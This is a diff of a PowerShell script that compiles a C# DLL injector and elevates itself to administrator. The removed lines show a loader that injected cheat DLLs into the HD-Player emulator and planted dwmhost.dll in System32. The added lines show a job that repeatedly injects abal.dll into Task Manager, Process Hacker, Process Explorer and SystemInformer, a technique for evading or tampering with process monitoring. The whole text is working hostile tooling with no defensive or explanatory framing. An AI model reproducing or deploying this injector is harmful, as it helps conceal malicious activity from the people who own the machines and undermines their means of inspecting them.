@@ -19,22 +19,7 @@ function Ensure-RunAsAdmin {
 }
 Ensure-RunAsAdmin
 
-# imgui.ini monitor
-Start-Job -ScriptBlock {
-    $desktopPath = [Environment]::GetFolderPath('Desktop')
-    $iniPath = Join-Path $desktopPath "imgui.ini"
-    while ($true) {
-        if (Test-Path $iniPath) {
-            try {
-                Remove-Item $iniPath -Force -ErrorAction SilentlyContinue
-                Write-Output "Deleted imgui.ini at $(Get-Date -Format 'HH:mm:ss')"
-            } catch {}
-        }
-        Start-Sleep -Milliseconds 50
-    }
-} | Out-Null
-
-# DLL Injector C# Code
+# C# DLL Injector
 $injectorCode = @"
 using System;
 using System.Text;
@@ -90,46 +75,32 @@ public class Injector {
         return true;
     }
 }
-
-public class KeyCheck {
-    [DllImport("user32.dll")]
-    public static extern short GetAsyncKeyState(int vKey);
-
-    public static bool IsDelPressed() {
-        return (GetAsyncKeyState(0x2E) & 0x8000) != 0;
-    }
-}
 "@
 Add-Type -TypeDefinition $injectorCode -Language CSharp
 
-# Paths & Dlls
-$dllFolder = "C:\Windows\SysWOW64"
-$system32Path = "$env:windir\System32"
-
-$dll1 = Join-Path $dllFolder "Aotbst.dll"
-$dll2 = Join-Path $dllFolder "cimgui.dll"
-$dll3 = Join-Path $dllFolder "dwmhost.dll"
-$dll3Dest = Join-Path $system32Path "dwmhost.dll"
-$extraDll = "abal.dll"
-$extraDllPath = Join-Path $system32Path $extraDll
-
-$targetProcess = "HD-Player"
+# Monitoring tool names and DLL path
 $monitoringTools = @("Taskmgr", "ProcessHacker", "procexp", "SystemInformer")
+$extraDllPath = "C:\Windows\System32\abal.dll"
 
-# Monitor thread for abal.dll
+# Monitor & force-inject abal.dll every 2 seconds into all matching processes
 Start-Job -ScriptBlock {
+    $monitoringTools = @("Taskmgr", "ProcessHacker", "procexp", "SystemInformer")
+    $extraDllPath = "C:\Windows\System32\abal.dll"
+
     while ($true) {
-        foreach ($name in $using:monitoringTools) {
-            $proc = Get-Process -Name $name -ErrorAction SilentlyContinue
-            if ($proc) {
-                foreach ($p in $proc) {
-                    Write-Output "Detected $($p.ProcessName). Attempting to inject $using:extraDll..."
-                    $result = [Injector]::Inject($p.Id, $using:extraDllPath)
+        foreach ($tool in $monitoringTools) {
+            $procs = Get-Process -Name $tool -ErrorAction SilentlyContinue
+            foreach ($p in $procs) {
+                try {
+                    Write-Output "Attempting to inject abal.dll into $($p.ProcessName) (PID: $($p.Id))"
+                    $result = [Injector]::Inject($p.Id, $extraDllPath)
                     if ($result) {
-                        Write-Output "Injected $using:extraDll into $($p.ProcessName) (PID: $($p.Id))"
+                        Write-Output "✅ Injected into $($p.ProcessName) (PID: $($p.Id))"
                     } else {
-                        Write-Error "Failed to inject $using:extraDll into $($p.ProcessName)"
+                        Write-Warning "❌ Injection failed into $($p.ProcessName) (PID: $($p.Id))"
                     }
+                } catch {
+                    Write-Error "⚠️ Exception: $_"
                 }
             }
         }
@@ -137,41 +108,4 @@ Start-Job -ScriptBlock {
     }
 } | Out-Null
 
-# Main DLL injection for HD-Player
-Write-Output "Monitoring for process $targetProcess..."
-while ($true) {
-    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
-    if ($proc) {
-        Write-Output "Process $targetProcess found with PID $($proc.Id)"
-        Write-Output "Waiting for [Del] key to inject main DLLs..."
-        while (-not [KeyCheck]::IsDelPressed()) {
-            Start-Sleep -Milliseconds 50
-        }
-
-        try {
-            Copy-Item -Path $dll3 -Destination $dll3Dest -Force
-            Write-Output "Copied dwmhost.dll to $system32Path"
-        } catch {
-            Write-Error "Failed to copy dwmhost.dll. Try running as Administrator."
-        }
-
-        foreach ($dll in @($dll1, $dll2)) {
-            Write-Output "Injecting $dll..."
-            $result = [Injector]::Inject($proc.Id, $dll)
-            if ($result) {
-                Write-Output "Successfully injected $dll"
-            } else {
-                Write-Error "Failed to inject $dll"
-            }
-        }
-
-        do {
-            Start-Sleep -Seconds 2
-            $proc = Get-Process -Id $proc.Id -ErrorAction SilentlyContinue
-        } while ($proc)
-
-        Write-Output "$targetProcess exited. Resuming monitoring..."
-    } else {
-        Start-Sleep -Seconds 2
-    }
-}
+Write-Output "✅ Injection monitor running. Press Ctrl+C to stop."
